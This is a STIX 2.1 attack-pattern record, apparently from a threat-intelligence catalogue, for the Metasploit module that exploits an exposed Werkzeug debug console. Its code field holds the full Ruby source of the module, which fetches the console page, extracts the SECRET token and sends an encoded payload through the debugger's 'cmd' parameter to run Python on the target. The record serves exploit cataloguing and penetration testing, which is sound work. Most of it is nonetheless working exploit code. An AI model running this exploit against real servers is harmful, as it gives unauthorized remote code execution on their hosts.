{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f964a13a-85c6-45dd-b092-59bee527e42a",
    "created": "2024-08-14T17:09:07.194825Z",
    "modified": "2024-08-14T17:09:07.194829Z",
    "name": "Werkzeug Debug Shell Command Execution",
    "description": " This module will exploit the Werkzeug debug console to put down a Python shell. This debugger \"must never be used on production machines\" but sometimes slips passed testing.  Tested against: 0.9.6 on Debian 0.9.6 on Centos 0.10  on Debian ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/werkzeug_debug_rce.rb",
            "external_id": "werkzeug_debug_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "http://werkzeug.pocoo.org/docs/0.10/debug/#enabling-the-debugger"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Werkzeug Debug Shell Command Execution',\n      'Description'    => %q{\n        This module will exploit the Werkzeug debug console to put down a\n        Python shell. This debugger \"must never be used on production\n        machines\" but sometimes slips passed testing.\n\n        Tested against:\n          0.9.6 on Debian\n          0.9.6 on Centos\n          0.10  on Debian\n      },\n      'Author'         => 'h00die <mike[at]shorebreaksecurity.com>',\n      'References'     =>\n        [\n          ['URL', 'http://werkzeug.pocoo.org/docs/0.10/debug/#enabling-the-debugger']\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['python'],\n      'Targets'        => [[ 'werkzeug 0.10 and older', {}]],\n      'Arch'           => ARCH_PYTHON,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-06-28'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'URI to the console', '/console'])\n      ], self.class\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => normalize_uri(datastore['TARGETURI'])\n    )\n\n    # https://github.com/mitsuhiko/werkzeug/blob/cc8c8396ecdbc25bedc1cfdddfe8df2387b72ae3/werkzeug/debug/tbtools.py#L67\n    if res && res.body =~ /Werkzeug powered traceback interpreter/\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # first we need to get the SECRET code\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => normalize_uri(datastore['TARGETURI'])\n    )\n\n    if res && res.body =~ /SECRET = \"([a-zA-Z0-9]{20})\";/\n      secret = $1\n      vprint_status(\"Secret Code: #{secret}\")\n      send_request_cgi(\n        'method'   => 'GET',\n        'uri'      => normalize_uri(datastore['TARGETURI']),\n        'vars_get' => {\n          '__debugger__' => 'yes',\n          'cmd'          => payload.encoded,\n          'frm'          => '0',\n          's'            => secret\n        }\n      )\n    else\n      print_error('Secret code not detected.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-28",
    "x_mitre_platforms": [
        "['python']"
    ]
}